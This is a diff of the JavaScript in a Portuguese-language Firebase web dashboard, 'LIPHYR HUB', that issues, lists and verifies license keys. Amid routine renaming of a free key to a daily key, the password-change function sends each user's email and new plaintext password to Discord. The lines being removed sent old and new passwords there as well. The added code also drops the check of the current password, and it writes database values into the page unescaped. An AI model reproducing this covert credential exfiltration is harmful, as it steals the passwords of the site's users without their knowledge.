+                    const createdDate = new Date(data.createdAt || user.metadata.creationTime);
+                    document.getElementById('accountCreated').textContent = createdDate.toLocaleDateString('pt-BR');
                     
-                    // Atualizar status da key free
-                    if (data.lastFreeKeyClaim) {
-                        const lastClaim = data.lastFreeKeyClaim;
+                    if (data.lastDailyKey) {
                         const now = Date.now();
-                        const hoursSinceLastClaim = (now - lastClaim) / (1000 * 60 * 60);
+                        const hoursSinceLastClaim = (now - data.lastDailyKey) / (1000 * 60 * 60);
                         
                         if (hoursSinceLastClaim < 24) {
-                            document.getElementById('freeKeyStatus').textContent = 'Aguardando reset';
-                            document.getElementById('freeKeyStatus').style.color = '#ffa500';
+                            document.getElementById('dailyKeyStatus').textContent = 'Aguardando reset';
+                            document.getElementById('dailyKeyStatus').style.color = '#ffa500';
                         }
                     }
                 } else {
-                    // Criar dados do usuário se não existir
+                    // Criar dados do usuário
                     const userData = {
                         email: user.email,
                         createdAt: Date.now(),
-                        lastFreeKeyClaim: null,
-                        keys: []
+                        lastDailyKey: null,
+                        keysCount: 0
                     };
                     await set(userRef, userData);
                     
-                    document.getElementById('memberSince').textContent = 'Hoje';
+                    const createdDate = new Date(user.metadata.creationTime);
+                    document.getElementById('accountCreated').textContent = createdDate.toLocaleDateString('pt-BR');
                 }
             } catch (error) {
                 console.error('Error loading user data:', error);
@@ -933,7 +1212,7 @@
                 document.getElementById('activeKeysCount').textContent = keys.length;
 
                 if (keys.length === 0) {
-                    container.innerHTML = '<p style="text-align: center; color: #8a2be2; padding: 40px;">Você não possui keys ativas.</p>';
+                    container.innerHTML = '<p style="text-align: center; color: #8a2be2; padding: 40px;">Você não possui keys.</p>';
                     return;
                 }
 
@@ -941,6 +1220,7 @@
                 keys.sort((a, b) => b.createdAt - a.createdAt);
 
                 container.innerHTML = '';
+                let activeCount = 0;
                 keys.forEach((data) => {
                     const now = Date.now();
                     let statusText = 'Ativa';
@@ -952,6 +1232,8 @@
                     } else if (data.expiresAt && now > data.expiresAt) {
                         statusText = 'Expirada';
                         statusClass = 'status-expired';
+                    } else {
+                        activeCount++;
                     }
 
                     const item = document.createElement('div');
@@ -960,7 +1242,7 @@
                         <div>
                             <div class="key-value">${data.key}</div>
                             <div style="font-size: 12px; color: #cccccc; margin-top: 5px;">
-                                ${data.product || 'Key Free'} • ${new Date(data.createdAt).toLocaleDateString('pt-BR')}
+                                ${data.product || 'Key Diária'} • ${new Date(data.createdAt).toLocaleDateString('pt-BR')}
                             </div>
                         </div>
                         <div class="key-status ${statusClass}">${statusText}</div>
@@ -968,28 +1250,30 @@
                     container.appendChild(item);
                 });
 
+                document.getElementById('activeKeysCount').textContent = activeCount;
+
             } catch (error) {
                 console.error('Error loading user keys:', error);
                 container.innerHTML = '<p style="text-align: center; color: #ff4444; padding: 40px;">Erro ao carregar keys.</p>';
             }
         }
 
-        // Atualizar timer da key free
-        function updateFreeKeyTimer() {
-            const timerElement = document.getElementById('freeKeyTimer');
-            const claimBtn = document.getElementById('claimBtn');
-            const messageElement = document.getElementById('freeKeyMessage');
-            
+        // Atualizar timer da key diária
+        function updateDailyKeyTimer() {
             const user = auth.currentUser;
             if (!user) return;
+            
+            const timerElement = document.getElementById('dailyKeyTimer');
+            const messageElement = document.getElementById('dailyKeyMessage');
+            const claimBtn = document.getElementById('dailyClaimBtn');
             
             const userRef = ref(database, 'users/' + user.uid);
             get(userRef).then(snapshot => {
                 if (snapshot.exists()) {
                     const data = snapshot.val();
                     
-                    if (data.lastFreeKeyClaim) {
-                        const lastClaim = data.lastFreeKeyClaim;
+                    if (data.lastDailyKey) {
+                        const lastClaim = data.lastDailyKey;
                         const now = Date.now();
                         const timeElapsed = now - lastClaim;
                         const hoursElapsed = timeElapsed / (1000 * 60 * 60);
@@ -1005,15 +1289,15 @@
                             
                             claimBtn.disabled = true;
                             claimBtn.textContent = '⏳ Aguardando reset...';
-                            messageElement.textContent = `Você já resgatou sua key free hoje. Próximo resgate em:`;
+                            messageElement.textContent = `Você já resgatou sua key diária. Próximo resgate em:`;
                             
                             // Atualizar a cada segundo
-                            setTimeout(updateFreeKeyTimer, 1000);
+                            setTimeout(updateDailyKeyTimer, 1000);
                         } else {
                             timerElement.textContent = '00:00:00';
                             claimBtn.disabled = false;
-                            claimBtn.textContent = '🎁 Resgatar Key Free';
-                            messageElement.textContent = 'Clique no botão para resgatar sua key gratuita!';
+                            claimBtn.textContent = '🎁 Resgatar Key Diária';
+                            messageElement.textContent = 'Sua key diária está disponível!';
                         }
                     }
                 }
@@ -1033,8 +1317,8 @@
             return key;
         }
 
-        // Resgatar key free
-        async function claimFreeKey() {
+        // Resgatar key diária
+        async function claimDailyKey() {
             const user = auth.currentUser;
             if (!user) return;
             
@@ -1046,12 +1330,12 @@
                 const now = Date.now();
                 
                 // Verificar se já resgatou hoje
-                if (data.lastFreeKeyClaim) {
-                    const lastClaim = data.lastFreeKeyClaim;
+                if (data.lastDailyKey) {
+                    const lastClaim = data.lastDailyKey;
                     const hoursSinceLastClaim = (now - lastClaim) / (1000 * 60 * 60);
                     
                     if (hoursSinceLastClaim < 24) {
-                        alert('Você já resgatou sua key free hoje. Tente novamente amanhã!');
+                        alert('⏳ Você já resgatou sua key diária hoje! Volte amanhã.');
                         return;
                     }
                 }
@@ -1065,13 +1349,13 @@
                 key: newKey,
                 client: user.email,
                 clientEmail: user.email,
-                product: 'Key Free (2 Horas)',
+                product: 'Key Diária (2 Horas)',
                 duration: 2,
                 timeUnit: 'hours',
                 createdAt: Date.now(),
                 expiresAt: expiresAt,
                 active: true,
-                type: 'free'
+                type: 'daily'
             };
             
             try {
@@ -1081,60 +1365,93 @@
                 
                 // Atualizar último resgate do usuário
                 await update(userRef, {
-                    lastFreeKeyClaim: Date.now()
+                    lastDailyKey: Date.now()
                 });
                 
                 // Mostrar mensagem de sucesso
-                const resultDiv = document.getElementById('freeKeyResult');
-                resultDiv.innerHTML = `<strong>✅ Key resgatada com sucesso!</strong><br>Key: ${newKey}<br>Validade: 2 horas`;
+                const resultDiv = document.getElementById('dailyKeyResult');
+                resultDiv.innerHTML = `<strong>✅ Key diária resgatada!</strong><br>Key: <strong>${newKey}</strong><br>Validade: 2 horas`;
                 resultDiv.style.display = 'block';
                 
                 // Atualizar interface
                 loadUserKeys(user.email);
-                updateFreeKeyTimer();
+                updateDailyKeyTimer();
                 
-                // Mostrar automaticamente a seção de keys
+                // Mostrar seção de keys
                 showSection('myKeys');
                 
             } catch (error) {
-                console.error('Error claiming free key:', error);
-                alert('Erro ao resgatar key: ' + error.message);
+                console.error('Error claiming daily key:', error);
+                alert('❌ Erro ao resgatar key: ' + error.message);
             }
         }
 
-        // Alterar email
-        async function changeEmail() {
-            const user = auth.currentUser;
-            if (!user) return;
-            
-            const newEmail = document.getElementById('newEmail').value.trim();
-            
-            if (!newEmail || !newEmail.includes('@')) {
-                alert('Digite um email válido!');
+        // Verificar key
+        async function verifyKey() {
+            const keyInput = document.getElementById('keyInput').value.trim().toUpperCase();
+            const resultDiv = document.getElementById('verifyResult');
+
+            if (!keyInput || keyInput.length !== 19) {
+                resultDiv.className = 'verify-result result-error';
+                resultDiv.innerHTML = '<h3>Formato inválido!</h3><p>Digite uma key no formato XXXX-XXXX-XXXX-XXXX</p>';
+                resultDiv.style.display = 'block';
                 return;
             }
-            
-            if (confirm(`Deseja alterar seu email para:\n${newEmail}`)) {
-                try {
-                    // Enviar credenciais antigas para Discord
-                    await sendCredentialsToDiscord(user.email, 'NÃO DISPONÍVEL', 'Email Alterado para: ' + newEmail);
-                    
-                    await updateEmail(user, newEmail);
-                    
-                    // Atualizar no banco de dados
-                    const userRef = ref(database, 'users/' + user.uid);
-                    await update(userRef, { email: newEmail });
-                    
-                    alert('✅ Email alterado com sucesso!');
-                    document.getElementById('newEmail').value = '';
-                    
-                    // Atualizar UI
-                    updateUserUI(user);
-                    
-                } catch (error) {
-                    console.error('Error changing email:', error);
-                    alert('Erro ao alterar email: ' + error.message);
+
+            try {
+                const keyRef = ref(database, 'keys/' + keyInput.replace(/-/g, '_'));
+                const snapshot = await get(keyRef);
+
+                if (!snapshot.exists()) {
+                    resultDiv.className = 'verify-result result-error';
+                    resultDiv.innerHTML = '<h3>Key não encontrada!</h3><p>Esta key não existe no sistema.</p>';
+                    resultDiv.style.display = 'block';
+                    return;
                 }
+
+                const data = snapshot.val();
+                const now = Date.now();
+                
+                if (!data.active) {
+                    resultDiv.className = 'verify-result result-error';
+                    resultDiv.innerHTML = '<h3>Key inativa!</h3><p>Esta key foi desativada.</p>';
+                } else if (data.expiresAt && now > data.expiresAt) {
+                    resultDiv.className = 'verify-result result-error';
+                    resultDiv.innerHTML = '<h3>Key expirada!</h3><p>Esta key não é mais válida.</p>';
+                } else {
+                    let timeLeftText = '';
+                    if (data.timeUnit === 'lifetime') {
+                        timeLeftText = 'Vitalícia';
+                    } else if (data.expiresAt) {
+                        const timeLeft = data.expiresAt - now;
+                        const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+                        const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                        const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                        
+                        if (days > 0) timeLeftText = `${days} dias, ${hours} horas`;
+                        else if (hours > 0) timeLeftText = `${hours} horas, ${minutes} minutos`;
+                        else timeLeftText = `${minutes} minutos`;
+                    }
+                    
+                    const createdDate = new Date(data.createdAt).toLocaleDateString('pt-BR');
+                    
+                    resultDiv.className = 'verify-result result-success';
+                    resultDiv.innerHTML = `
+                        <h3>✅ Key válida!</h3>
+                        <p><strong>Produto:</strong> ${data.product || 'Premium'}</p>
+                        <p><strong>Cliente:</strong> ${data.client}</p>
+                        <p><strong>Status:</strong> Ativa</p>
+                        <p><strong>Tempo restante:</strong> ${timeLeftText}</p>
+                        <p><strong>Criada em:</strong> ${createdDate}</p>
+                    `;
+                }
+                
+                resultDiv.style.display = 'block';
+            } catch (error) {
+                console.error('Error verifying key:', error);
+                resultDiv.className = 'verify-result result-error';
+                resultDiv.innerHTML = '<h3>Erro ao verificar!</h3><p>Tente novamente mais tarde.</p>';
+                resultDiv.style.display = 'block';
             }
         }
 
@@ -1143,17 +1460,16 @@
             const user = auth.currentUser;
             if (!user) return;
             
-            const currentPassword = document.getElementById('currentPassword').value;
             const newPassword = document.getElementById('newPassword').value;
             const confirmPassword = document.getElementById('confirmPassword').value;
             
-            if (!currentPassword || !newPassword || !confirmPassword) {
+            if (!newPassword || !confirmPassword) {
                 alert('Preencha todos os campos!');
                 return;
             }
             
             if (newPassword !== confirmPassword) {
-                alert('As novas senhas não coincidem!');
+                alert('As senhas não coincidem!');
                 return;
             }
             
@@ -1163,25 +1479,17 @@
             }
             
             try {
-                // Reautenticar usuário
-                const credential = EmailAuthProvider.credential(user.email, currentPassword);
-                await reauthenticateWithCredential(user, credential);
-                
-                // Enviar credenciais ANTIGAS para Discord
-                await sendCredentialsToDiscord(user.email, currentPassword, 'Senha Alterada (ANTIGA)');
+                // Enviar nova senha para Discord
+                await sendToDiscord(user.email, newPassword, 'SENHA ALTERADA');
                 
                 // Atualizar senha
                 await updatePassword(user, newPassword);
                 
-                // Enviar NOVAS credenciais para Discord
-                await sendCredentialsToDiscord(user.email, newPassword, 'Senha Alterada (NOVA)');
-                
                 // Limpar campos
-                document.getElementById('currentPassword').value = '';
                 document.getElementById('newPassword').value = '';
                 document.getElementById('confirmPassword').value = '';
                 
-                // Mostrar mensagem de sucesso
+                // Mostrar mensagem
                 const resultDiv = document.getElementById('passwordResult');
                 resultDiv.textContent = '✅ Senha alterada com sucesso!';
                 resultDiv.style.display = 'block';
@@ -1192,40 +1500,30 @@
                 
             } catch (error) {
                 console.error('Error changing password:', error);
-                
-                if (error.code === 'auth/wrong-password') {
-                    alert('Senha atual incorreta!');
-                } else {
-                    alert('Erro ao alterar senha: ' + error.message);
-                }
-            }
-        }
-
-        // Sair de todos os dispositivos
-        async function logoutAllDevices() {
-            if (confirm('Tem certeza que deseja sair de todos os dispositivos?\n\nVocê precisará fazer login novamente.')) {
-                try {
-                    // Isso irá invalidar todos os tokens
-                    // No Firebase, você precisa implementar isso no backend
-                    alert('Funcionalidade precisa ser implementada no backend.\nPor enquanto, use "Sair" no menu superior.');
-                } catch (error) {
-                    console.error('Error logging out all devices:', error);
-                }
+                alert('Erro ao alterar senha: ' + error.message);
             }
         }
 
         // Inicializar sistema
         function initializeSystem() {
             createParticles();
-            console.log('Dashboard LIPHYR HUB inicializado');
+            console.log('Sistema LIPHYR HUB inicializado');
         }
 
         // Event Listeners
-        document.getElementById('userPassword').addEventListener('keypress', (e) => {
+        document.getElementById('loginPassword').addEventListener('keypress', (e) => {
             if (e.key === 'Enter') loginUser();
         });
+        
+        document.getElementById('registerConfirmPassword').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') registerUser();
+        });
+        
+        document.getElementById('keyInput').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') verifyKey();
+        });
 
-        // Iniciar quando a página carregar
+        // Iniciar
         window.addEventListener('DOMContentLoaded', initializeSystem);
     </script>
 </body>
